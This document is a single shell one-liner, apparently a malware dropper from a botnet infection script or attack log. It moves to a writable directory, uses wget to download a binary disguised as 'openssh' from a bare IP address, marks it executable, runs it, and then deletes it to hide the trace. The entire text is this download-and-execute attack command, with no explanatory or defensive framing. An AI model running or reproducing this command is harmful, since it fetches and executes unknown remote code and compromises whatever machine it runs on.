cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://204.48.27.216/openssh; chmod +x openssh; ./openssh; rm -rf openssh
